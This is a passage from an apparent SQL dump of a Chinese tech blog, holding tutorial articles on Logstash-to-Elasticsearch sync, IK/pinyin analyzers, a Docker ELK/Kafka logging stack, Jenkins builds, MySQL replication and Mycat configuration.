logstash的配置文件信息\n```kotlin\n## 配置文件说明\ninput {\n  jdbc {\n    jdbc_driver_library => \"/usr/local/sql/mysql-connector-java-5.1.46.jar\"\n    jdbc_driver_class => \"com.mysql.jdbc.Driver\"\n    jdbc_connection_string => \"jdbc:mysql://192.168.147.101:3306/test?useSSL=false\"\n    jdbc_user => \"root\"\n    jdbc_password => \"1234\"\n    schedule => \"* * * * *\"\n    statement => \"SELECT * FROM user WHERE update_time >= :sql_last_value\"\n    # 使用递增值\n    use_column_value => true\n    # 递增类型时间戳\n    tracking_column_type => \"timestamp\"\n    # 表中的递增字段\n    tracking_column => \"update_time\"\n    last_run_metadata_path => \"syncpoint_table\"\n  }\n}\n\n\noutput {\n    elasticsearch {\n        # ES的IP地址及端口\n        hosts => [\"192.168.147.100:9200\"]\n        # 索引名称 可自定义\n        index => \"user\"\n        # 需要关联的数据库中有有一个id字段，对应类型中的id\n        document_id => \"%{id}\"\n        document_type => \"user\"\n    }\n    stdout {\n        # JSON格式输出\n        codec => json_lines\n    }\n} \n```\n\n#### logstash配置文件详细说明\n```kotlin\n## 配置文件说明\njdbc_driver_library: // jdbc的信息\njdbc_driver_class: // 驱动类的名字，mysql填 com.mysql.jdbc.Driver\njdbc_connection_string: // mysql地址\njdbc_user: // mysql用户\njdbc_password: // mysql密码\nschedule: // 执行 sql 时机，类似 crontab 的调度\nstatement: // 要执行的 sql，以 “:” 开头是定义的变量，可以通过 parameters 来设置变量，这里的 sql_last_value 是内置的变量，表示上一次 sql 执行中 update_time 的值，这里 update_time 条件是 >= 因为时间有可能相等，没有等号可能会漏掉一些增量\nuse_column_value: // 使用递增列的值\ntracking_column_type: // 递增字段的类型，numeric 表示数值类型, timestamp 表示时间戳类型\ntracking_column: // 递增字段的名称，这里使用 update_time 这一列，这列的类型是 timestamp\nlast_run_metadata_path: // 同步点文件，这个文件记录了上次的同步点，重启时会读取这个文件，这个文件可以手动\n```\n\n### 同步多张表至elasticsearch\n![TIM截图20190514223725.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1557923220_TIM截图20190514223725.png)\n![TIM截图20190514223534.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1557923676_TIM截图20190514223534.png)\n![TIM截图20190514224558.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1557923220_TIM截图20190514224558.png)\n![TIM截图20190514224649.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1557923220_TIM截图20190514224649.png)\n```kotlin\n// 1. 进入logstash的config目录\ncd /usr/local/logstash-6.4.3/config\n\n// 2. 修改pipelines文件\nvi pipelines.yml\n\n// 3. 添加logstash输入输出的配置文件位置\n- pipeline.id: table1\n  path.config: \"config/sync_table1.cfg\"\n- pipeline.id: table2\n  path.config: \"config/sync_table2.cfg\"\n\n// 4. 不指定配置文件运行,logstash将以config/pipelines.yml文件中配置内容运行\n./bin/logstash\n```\n\n### logstash原理\n#### logstashd的输入与输出\n1. 输入（读取本地文件或者连接数据库）\n2. 输出（输出json至存储库)\n\n#### 如何数据新增呢？或者修改 \n```kotlin\n// 1. 第一次发送sql请求的时候,修改时间参数值是为系统最开始的时间是1970年，可以查询到所有的数据,\n// 会将最后一条数据的update_time修改时间值记录下来，作为下一次修改时间查询的条件值\n// 2.  第一条\nSELECT * FROM user WHERE update_time >=\'1970\'\n// 3. 第二条\nSELECT * FROM user WHERE update_time >=\'2019-05-15 20:47:15\n \n4. 新增或者修改、删除的时候logstash都会记录update_time时间。\n```\n\n#### 书面原理\n1. 定时执行一个 sql，然后将 sql 执行的结果写入到流中\n2. 增量获取的方式没有通过 binlog 方式同步，而是用一个递增字段作为条件去查询，每次都记录当前查询的位置\n3. 由于递增的特性，只需要查询比当前大的记录即可获取这段时间内的全部增量，一般的递增字段有两种，AUTO_INCREMENT 的主键 id 和 ON UPDATE CURRENT_TIMESTAMP 的 update_time 字段\n4. id 字段只适用于那种只有插入没有更新的表，update_time 更加通用一些，建议在 mysql 表设计的时候都增加一个 update_time 字段\n\n### 连接elasticsearch集群\n![TIM截图20190515224807.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1557933576_TIM截图20190515224807.png)\n![TIM截图20190515230202.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1557933576_TIM截图20190515230202.png)\n```kotlin\n// 1. 修改每张表的logstash配置文件\nvi mysql_1.conf\nvi mysql_2.conf\n\n// 2. es服务列表添加es节点地址\nhosts => [\"192.168.147.100:9200\",\"192.168.147.100:9201\"]\n\n// 3. 启动logstash\n./bin/logstash -f\n```', 0, 0, 39, 0, 0, '2019-05-15 19:51:57', '2019-06-16 14:05:02', 0, 0);
INSERT INTO `article` VALUES (54, 1, 'elasticsearch配置IK中文分词器及pinyin拼音分词器', '2019/5/1558176015_038447c6811547957643f80617c0c99d.jpg', '### 依赖及示范代码\n链接：https://pan.baidu.com/s/1x1_cna0Zf6-d0kCjA6byqw \n提取码：x528\n\n## IK分词器\n### 安装IK分词器\n#### 检查es版本\n###### 分词器的版本需要和es版本一致\n![TIM截图20190516211551.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558176703_TIM截图20190516211551.png)\n\n#### 修改IKAnalyzer.cfg.xml\n![TIM截图20190518172340.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558176993_TIM截图20190518172340.png)\n\n#### 上传IK分词器包并启动es集群\n![TIM截图20190518140106.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558176703_TIM截图20190518140106.png)\n\n#### 查看ik是否安装成功\n![TIM截图20190518140339.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558176704_TIM截图20190518140339.png)\n\n### IK分词模式\n![TIM截图20190518190632.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558177787_TIM截图20190518190632.png)\n![TIM截图20190518190756.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558177787_TIM截图20190518190756.png)\n#### ik_smart与ik_max_word区别\n1. ik_smart: 会做*最粗粒度的拆分*，比如会将\"中华人民共和国国歌\"拆分为\"中华人民共和国,国歌\"。\n2. ik_max_word: 会将文本做*最细粒度的拆分*，比如会将\"中华人民共和国国歌\"拆分为\"中华人民共和国,中华人民,中华,华人,人民共和国,人民,人,民,共和国,共和,和,国国,国歌\"，会穷尽各种可能的组合\n\n### 使用IK进行分词查询\n#### 解决logstash默认创建索引映射不使用指定分词器问题\n![TIM截图20190518141541.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558178065_TIM截图20190518141541.png)\n![TIM截图20190518141752.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558178065_TIM截图20190518141752.png)\n![TIM截图20190518192251.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558178605_TIM截图20190518192251.png)\n```kotlin\n// 1. 删除原有logstash自动创建的默认索引\nDELETE /user\n\n// 2. 重新创建索引 	\nPUT /user\n\n// 3. 自定义的索引映射\nPOST /user/_mapping/user\n{\n  \"user\": {\n    \"properties\": {\n      \"@timestamp\": {\n        \"type\": \"date\"\n      },\n      \"@version\": {\n        \"type\": \"text\",\n        \"fields\": {\n          \"keyword\": {\n            \"type\": \"keyword\",\n            \"ignore_above\": 256\n          }\n        }\n      },\n      \"id\": {\n        \"type\": \"long\"\n      },\n      \"name\": {\n        \"type\": \"text\",\n        \"analyzer\":\"ik_smart\",\n        \"search_analyzer\":\"ik_smart\",\n        \"fields\": {\n          \"keyword\": {\n            \"type\": \"keyword\",\n            \"ignore_above\": 256\n          }\n        }\n      },\n      \"update_time\": {\n        \"type\": \"date\"\n      }\n    }\n  }\n}\n\n// 4.查看索引映射信息,检查是否创建成功\nGET /user/_mapping \n```\n![TIM截图20190518142645.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558178065_TIM截图20190518142645.png)\n![TIM截图20190518142721.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558178065_TIM截图20190518142721.png)\n![TIM截图20190518142853.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558178065_TIM截图20190518142853.png)\n\n#### 测试IK是否奏效\n![TIM截图20190518172154.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558178065_TIM截图20190518172154.png)\n\n## pinyin分词器\n### 安装pinyin分词器\n#### 上传pinyin分词器包并启动es集群\n![TIM截图20190518195854.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558186350_TIM截图20190518195854.png)\n\n#### 查看pinyin分词器是否安装成功\n![TIM截图20190518200008.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558186350_TIM截图20190518200008.png)\n![TIM截图20190518200445.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558186350_TIM截图20190518200445.png)\n\n### 使用ik+pinyin进行分词查询\n#### 解决logstash默认创建索引映射不使用指定分词器问题\n![TIM截图20190518201500.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558186351_TIM截图20190518201500.png)\n![TIM截图20190518203106.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558186351_TIM截图20190518203106.png)\n![TIM截图20190518204044.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558186351_TIM截图20190518204044.png)\n![TIM截图20190518210929.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558186351_TIM截图20190518210929.png)\n```kotlin\n// 1. 删除原有的索引映射\nDELETE /user\n\n// 2. 自定义分词器ik_smart_pinyin和ik_max_word_pinyin,将IK分词器与pinyin分词器合并使用\nPUT /user \n{\n   \"settings\": {\n        \"analysis\": {\n            \"analyzer\": {\n                \"ik_smart_pinyin\": {\n                    \"type\": \"custom\",\n                    \"tokenizer\": \"ik_smart\",\n                    \"filter\": [\"my_pinyin\", \"word_delimiter\"]\n                },\n                \"ik_max_word_pinyin\": {\n                    \"type\": \"custom\",\n                    \"tokenizer\": \"ik_max_word\",\n                    \"filter\": [\"my_pinyin\", \"word_delimiter\"]\n                }\n            },\n            \"filter\": {\n                \"my_pinyin\": {\n                    \"type\" : \"pinyin\",\n                    \"keep_separate_first_letter\" : true,\n                    \"keep_full_pinyin\" : true,\n                    \"keep_original\" : true,\n                    \"limit_first_letter_length\" : 16,\n                    \"lowercase\" : true,\n                    \"remove_duplicated_term\" : true \n                }\n            }\n        }\n  }\n}\n\n// 3. 自定义索引映射,索引字段使用自定义的分词器\nPOST /user/_mapping/user\n{\n  \"user\": {\n    \"properties\": {\n      \"@timestamp\": {\n        \"type\": \"date\"\n      },\n      \"@version\": {\n        \"type\": \"text\",\n        \"fields\": {\n          \"keyword\": {\n            \"type\": \"keyword\",\n            \"ignore_above\": 256\n          }\n        }\n      },\n      \"id\": {\n        \"type\": \"long\"\n      },\n      \"name\": {\n        \"type\": \"text\",\n        \"analyzer\":\"ik_smart_pinyin\",\n        \"search_analyzer\": \"ik_smart_pinyin\",\n        \"fields\": {\n          \"keyword\": {\n            \"type\": \"keyword\",\n            \"ignore_above\": 256\n          }\n        }\n      },\n      \"update_time\": {\n        \"type\": \"date\"\n      }\n    }\n  }\n}\n\n// 4. 查询索引映射信息,检查是否创建成功\nGET /user/_mapping\n```\n#### 测试pinyin是否奏效\n![TIM截图20190518211327.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558186351_TIM截图20190518211327.png)', 0, 0, 37, 0, 0, '2019-05-18 18:40:23', '2019-06-16 14:03:16', 0, 0);
INSERT INTO `article` VALUES (55, 1, 'docker分布式日志收集ELK搭建', '2019/5/1558265177_8a215d98bcadbd79036ed1d2e161b42a.jpg', '### 依赖及示范代码\n链接：https://pan.baidu.com/s/1273FsYYIXKYeVlN1ao49Vw \n提取码：sirh\n\n### 目的\n![elkjiagou.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558268929_elkjiagou.png)\n1. 应用中出现错误需记录日志时,将日志发送给kafka\n2. logstash获取kafka中的日志信息内容\n3. logstash再将日志写入elasticsearch,这样elasticsearch就有了日志数据了\n4. 最后,使用kibana将存放在elasticsearch中的日志数据显示出来,并且可以做实时的数据图表分析等等\n\n#### 为什么要分布式日志收集\n1. 在传统项目中，如果在生产环境中，有多台不同的服务器集群，如果生产环境需要通过日志定位项目的Bug的话，需要在每台节点上使用传统的命令方式查询，这样效率非常底下\n2. 通常，日志被分散在储存不同的设备上。如果你管理数十上百台服务器，你还在使用依次登录每台机器的传统方法查阅日志。这样是不是感觉很繁琐和效率低下。当务之急我们使用集中化的日志管理，例如：开源的syslog，将所有服务器上的日志收集汇总。\n3. 集中化管理日志后，日志的统计和检索又成为一件比较麻烦的事情，一般我们使用grep、awk和wc等Linux命令能实现检索和统计，但是对于要求更高的查询、排序和统计等要求和庞大的机器数量依然使用这样的方法难免有点力不从心。\n4. 我们需要统一管理日志并快速排查问题\n5. 运用elasticsearch+logstash+kafka的组合可以解决这个问题\n\n### 下载kafka与zookeeper\n![TIM截图20190519151904.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558268929_TIM截图20190519151904.png)\n![TIM截图20190519155741.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558268929_TIM截图20190519155741.png)\n![TIM截图20190519160613.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558268929_TIM截图20190519160613.png)\n```kotlin\n// 1. 重启docker并删除所有未运行的容器\nsystemctl restart docker\ndocker rm $(sudo docker ps -a -q)\n\n// 2. 下载kafka和Zookeeper镜像文件\ndocker pull wurstmeister/kafka\ndocker pull wurstmeister/zookeeper\n\n// 3. 运行Zookeeper环境\ndocker run -d --name zookeeper -p 2181:2181 -t wurstmeister/zookeeper\n\n// 4. 关闭防火墙,防止kafka访问不到zookeeper\nsystemctl stop firewalld\n\n// 5. 运行Kafka环境,注意服务ip\ndocker run --name kafka01 \\\n		-p 9092:9092 \\\n		-e KAFKA_BROKER_ID=0 \\\n		-e KAFKA_ZOOKEEPER_CONNECT=192.168.147.100:2181 \\\n		-e KAFKA_ADVERTISED_LISTENERS=PLAINTEXT://192.168.147.100:9092 \\\n		-e KAFKA_LISTENERS=PLAINTEXT://0.0.0.0:9092 \\\n		-d  wurstmeister/kafka\n\n// 6. kafka-manager有图形化UI,注意服务ip\ndocker run -itd \\\n		--restart=always \\\n		--name=kafka-manager \\\n		-p 9000:9000 \\\n		-e ZK_HOSTS=\"192.168.147.100:2181\" \\\n		sheepkiller/kafka-manager\n\n// 7. 进入kafka容器\ndocker exec -it kafka01 /bin/bash\n\n// 8. 创建my_log topic,注意服务ip\n/opt/kafka/bin/kafka-topics.sh --create --zookeeper 192.168.147.100:2181 --replication-factor 1 --partitions 1 --topic my_log\n\n// 9. 查询创建的主题,检查主题是否成功发布,注意服务ip\n/opt/kafka/bin/kafka-topics.sh --list --zookeeper 192.168.147.100:2181\n```\n### logstash读取kafka中日志内容并输出至elasticsearch\n#### 确认es集群,zookeeper,kafka,kibana正常运行\n###### 关于es集群查看另一篇文章https://blog.tuwq.cn/article/52\n![TIM截图20190519180115.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558269541_TIM截图20190519180115.png)\n#### 编写logtash输入输出配置文件\n![TIM截图20190519172747.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558269541_TIM截图20190519172747.png)\n```kotlin\ninput {\n	 kafka {\n	   bootstrap_servers => \"192.168.147.100:9092\"\n	   topics => [\"my_log\"]\n	 }\n}\noutput {\n	   stdout { codec => rubydebug }\n	   elasticsearch {\n	      hosts => [\"192.168.147.100:9200\",\"192.168.147.100:9201\"]\n	      index => \"my_log\"\n	   }\n} \n```\n#### 启动logstash\n![TIM截图20190519180549.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558269541_TIM截图20190519180549.png)\n```kotlin\n// 指定配置文件启动logstash,logstash目录下\n./bin/logstash -f ./myconfig/mylog.conf\n```\n\n\n### 应用服务器发送日志至kafka\n![TIM截图20190519181300.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558269760_TIM截图20190519181300.png)\n![TIM截图20190519181201.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558269761_TIM截图20190519181201.png)\n![TIM截图20190519182307.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558269761_TIM截图20190519182307.png)\n\n### 查看流程是否打通\n![TIM截图20190519182450.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558269761_TIM截图20190519182450.png)\n![TIM截图20190519182627.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558269761_TIM截图20190519182627.png)', 0, 0, 36, 0, 0, '2019-05-19 19:26:52', '2019-06-16 14:02:08', 0, 0);
INSERT INTO `article` VALUES (56, 1, 'docker安装jenkins并拉取pom项目打包启动', '2019/5/1558881111_b466c3f4accf55d4937c2b6b0fcd03c4.jpg', '### 目的\n![jiagegou.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558882726_jiagegou.png)\n1. 利用jenkins拉取git上的项目\n2. 将项目放入jenkins中进行管理\n\n### 安装搭建\n#### 下载镜像启动容器\n![TIM截图20190526200230.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558881840_TIM截图20190526200230.png)\n\n#### 获取初始密码\n![TIM截图20190526200307.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558881841_TIM截图20190526200307.png)\n![TIM截图20190526200419.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558881841_TIM截图20190526200419.png)\n```kotlin\n// 1. 使用docker 安装jenkins\ndocker run -d -p 8080:8080 -p 50000:50000 -v jenkins_data:/var/jenkins_home jenkinsci/blueocean \n\n// 2. 关闭防火墙\nsystemctl stop firewalld\n\n// 3. 查看容器是否正常运行\ndocker ps\n\n// 4. 进入jenkins容器\ndocker exec -it 3d98fb9988ef /bin/bash\n\n// 5. 查看初始密码\ncat /var/jenkins_home/secrets/initialAdminPassword\n```\n\n#### 进入主页面\n![TIM截图20190526200837.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558881841_TIM截图20190526200837.png)\n![TIM截图20190526200933.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558881841_TIM截图20190526200933.png)\n![TIM截图20190526200958.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558881841_TIM截图20190526200958.png)\n![TIM截图20190526201015.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558881841_TIM截图20190526201015.png)\n\n### 配置jdk\n###### jenkins中自带了jdk,查询JAVA_HOME位置\n![TIM截图20190526205636.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558882266_TIM截图20190526205636.png)\n![TIM截图20190526205950.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558882266_TIM截图20190526205950.png)\n![TIM截图20190526210119.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558882266_TIM截图20190526210119.png)\n```kotlin\n// 1. 进入容器\ndocker exec -it 3d98fb9988ef /bin/bash\n\n// 2. 查询JAVA_HOME地址\necho $JAVA_HOME\n``` \n\n\n### 配置maven\n#### 下载maven\n1. jenkins中不携带maven,需要自行下载 \n2. https://repo.maven.apache.org/maven2/org/apache/maven/apache-maven/ \n\n####  更换maven镜像源\n![TIM截图20190526210418.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558882266_TIM截图20190526210418.png)\n![TIM截图20190526210803.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558882267_TIM截图20190526210803.png)\n![TIM截图20190526210909.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558882267_TIM截图20190526210909.png)\n```kotlin\n// 1. 将maven放入jenkins容器目录中\ndocker cp /usr/apache-maven-3.6.1 3d98fb9988ef:/var/lib/\n```\n\n### 拉取git上的pom项目\n#### 下载maven插件\n![TIM截图20190526201120.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883001_TIM截图20190526201120.png)\n![TIM截图20190526201325.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883002_TIM截图20190526201325.png)\n![TIM截图20190526205352.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883002_TIM截图20190526205352.png)\n```kotlin\n// 1. 进入容器\ndocker exec -it 3d98fb9988ef /bin/bash\n\n// 2. 修改/var/jenkins_home/hudson.model.UpdateCenter.xml文件,更换镜像源\nvi /var/jenkins_home/hudson.model.UpdateCenter.xml\nhttp://mirror.xmission.com/jenkins/updates/current/update-center.json \n\n// 2. 重启docker\nsystemctl restart docker\n\n// 3. 运行jenkins容器\ndocker start 3d98fb9988ef\n```\n![TIM截图20190526203158.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883002_TIM截图20190526203158.png)\n![TIM截图20190526205604.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883002_TIM截图20190526205604.png)\n\n#### 新建任务配置git仓库信息\n![TIM截图20190526211417.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883460_TIM截图20190526211417.png)\n![TIM截图20190526211119.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883460_TIM截图20190526211119.png)\n![TIM截图20190526211159.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883460_TIM截图20190526211159.png)\n![TIM截图20190526211222.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883460_TIM截图20190526211222.png)\n![TIM截图20190526211249.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883460_TIM截图20190526211249.png)\n![TIM截图20190526211512.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883617_TIM截图20190526211512.png)\n![TIM截图20190526211623.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883617_TIM截图20190526211623.png)\n![TIM截图20190526211653.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883617_TIM截图20190526211653.png)\n![TIM截图20190526211823.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883617_TIM截图20190526211823.png)\n\n#### 构建项目并开放容器的端口\n![TIM截图20190526211908.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883618_TIM截图20190526211908.png)\n![TIM截图20190526212019.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883618_TIM截图20190526212019.png)\n![TIM截图20190526212359.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883945_TIM截图20190526212359.png)\n![TIM截图20190526212521.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883945_TIM截图20190526212521.png)\n![TIM截图20190526213129.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883945_TIM截图20190526213129.png)\n![TIM截图20190526213341.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883945_TIM截图20190526213341.png)\n![TIM截图20190526213609.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883945_TIM截图20190526213609.png)\n![TIM截图20190526214441.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883945_TIM截图20190526214441.png)\n![TIM截图20190526214848.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883945_TIM截图20190526214848.png)\n![TIM截图20190526215252.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883946_TIM截图20190526215252.png)\n![TIM截图20190526215540.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883946_TIM截图20190526215540.png)\n![TIM截图20190526215646.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883946_TIM截图20190526215646.png)\n```kotlin\n// 1. 查看容器名称\ndocker ps\n\n// 2. 查看某容器的配置信息,查看某容器的hashId\ndocker inspect quizzical_golick\n\n// 3. 进入docker的容器配置目录\ncd /var/lib/docker/containers/容器的hashId\n\n// 4. 修改config.v2.json,注意位置\nvi config.v2.json\n\"7000/tcp\":{}\n\n// 5. 修改hostconfig.json,注意位置\nvi hostconfig.json\n\"7000/tcp\":[{\"HostIp\":\"\",\"HostPort\":\"7000\"}]\n\n// 6. 重启docker\nsystemctl stop docker\n\n// 7. 启动jenkins\ndocker start 3d98fb9988ef\n\n// 8. 查看端口是否被开放\ndocker ps\n```\n\n### 构建时自动启动项目\n![TIM截图20190526215826.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558884668_TIM截图20190526215826.png)\n![TIM截图20190526220040.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558884668_TIM截图20190526220040.png)\n![TIM截图20190526220135.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558884668_TIM截图20190526220135.png)\n![TIM截图20190526220446.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558884668_TIM截图20190526220446.png)\n```kotlin\n## 脚本,自行修改\n#!/bin/bash\n#服务名称\nSERVER_NAME=springboot-basic\n# 源jar路径,mvn打包完成之后，target目录下的jar包名称，也可选择成为war包，war包可移动到Tomcat的webapps目录下运行，这里使用jar包，用java -jar 命令执行  \nJAR_NAME=springboot-basic-0.0.1\n# 源jar路径  \n#/usr/local/jenkins_home/workspace--->jenkins 工作目录\n#demo 项目目录\n#target 打包生成jar包的目录\nJAR_PATH=/var/jenkins_home/workspace/springboot-basic/target\n# 打包完成之后，把jar包移动到运行jar包的目录--->work_daemon，work_daemon这个目录需要自己提前创建\nJAR_WORK_PATH=/var/jenkins_home/workspace/springboot-basic/target\n\necho \"查询进程id-->$SERVER_NAME\"\nPID=`ps -ef | grep \"$SERVER_NAME\" | awk \'{print $2}\'`\necho \"得到进程ID：$PID\"\necho \"结束进程\"\nfor id in $PID\ndo\n	kill -9 $id  \n	echo \"killed $id\"  \ndone\necho \"结束进程完成\"\n\n#复制jar包到执行目录\necho \"复制jar包到执行目录:cp $JAR_PATH/$JAR_NAME.jar $JAR_WORK_PATH\"\ncp $JAR_PATH/$JAR_NAME.jar $JAR_WORK_PATH\necho \"复制jar包完成\"\ncd $JAR_WORK_PATH\n#修改文件权限\nchmod 755 $JAR_NAME.jar\n\njava -jar $JAR_NAME.jar\n\n# 后台启动\nBUILD_ID=dontKillMe nohup java -jar  $JAR_NAME.jar  &\n```', 0, 0, 35, 0, 0, '2019-05-26 22:31:59', '2019-05-26 23:32:27', 0, 0);
INSERT INTO `article` VALUES (57, 1, 'mysql主从复制配置', '2019/5/1559048553_5698C9B20BF182F5C826636B267CA7E8.jpg', '### 目的\n![masterslavecopy.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559049221_masterslavecopy.png)\n#### 主从复制目的\n1. 高可用集群\n2. 读写分离\n3. 故障转移\n\n### 主服务器配置\n![TIM截图20190528195515.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559049222_TIM截图20190528195515.png)\n![TIM截图20190528200133.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559049222_TIM截图20190528200133.png)\n```kotlin\n// 1. 修改/etc/my.cnf\nserver_id=100\nlog-bin=mysql-bin\n\n// 2. 重启mysql服务\nservice mysqld restart\n\n// 3. 验证是否配置成功\nshow variables like \'%server_id%\';\n\n// 4. 查看日志文件\nshow master status;\n```\n\n### 从服务器配置\n![TIM截图20190528200955.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559049223_TIM截图20190528200955.png)\n![TIM截图20190528203124.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559049223_TIM截图20190528203124.png)\n```kotlin\n// 1. 修改/etc/my.cnf\nserver_id=101\nlog-bin=mysql-bin\nbinlog_do_db=test	// 同步数据库名称\n\n// 2. 重启mysql服务\nservice mysql restart\n\n// 3. 验证是否配置成功\nshow variables like \'%server_id%\';\n\n// 4. 查看日志文件\nshow master status;\n\n// 5. 同步配置,添加主服务器相关信息\nchange master to master_host=\'192.168.147.100\',master_user=\'root\',master_password=\'1234\',\n         master_log_file=\'mysql-bin.000001\',master_log_pos=120;\n\n// 6. 开始同步\nstart slave;\n\n// 7. 验证复制功能状态\nshow slave status;\n```\n\n### 验证效果成功\n![TIM截图20190528203631.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559049223_TIM截图20190528203631.png)\n![TIM截图20190528204129.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559049223_TIM截图20190528204129.png)', 1, 0, 29, 0, 0, '2019-05-28 21:02:44', '2019-06-02 21:42:06', 0, 0);
INSERT INTO `article` VALUES (58, 1, 'mycat读写分离配置', '2019/5/1559131412_04853a2686c7c630bd8dabd5f95f813f.jpg', '### 依赖及示范代码\n链接：https://pan.baidu.com/s/1lzritHAf8YrxSiYVGL-r-g \n提取码：pc0i \n\n### 目的\n![readwritesplit.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559132775_readwritesplit.png)\n1. 读写分离,简单来说是把对数据库的读和写操作分开\n2. 有效地减轻单台服务库压力\n\n### 配置mycat\n![TIM截图20190528222335.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559132775_TIM截图20190528222335.png)\n![TIM截图20190528225820.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559132776_TIM截图20190528225820.png)\n![TIM截图20190528231623.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559132776_TIM截图20190528231623.png)\n![TIM截图20190528232130.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559132776_TIM截图20190528232130.png)\n```kotlin\n// 1. 解压mycat\ntar -zxvf Mycat-server-1.6.5-release-20180122220033-linux.tar.gz\n\n// 2. 进入mycat目录\ncd mycat\n\n// 3. 进入mycat配置目录\ncd conf \n```\n#### schema.xml配置\n```kotlin\n<?xml version=\"1.0\"?>\n<!DOCTYPE mycat:schema SYSTEM \"schema.dtd\">\n<mycat:schema xmlns:mycat=\"http://io.mycat/\">\n    <!-- TESTDB1 是mycat的逻辑库名称，链接需要用的 -->\n    <schema name=\"mycat_testdb\" checkSQLschema=\"false\" sqlMaxLimit=\"100\" dataNode=\"dn1\"></schema>\n        <!-- database 是MySQL数据库的库名 -->\n    <dataNode name=\"dn1\" dataHost=\"localhost1\" database=\"test\" />\n    <!--\n    dataNode节点中各属性说明：\n    name：指定逻辑数据节点名称；\n    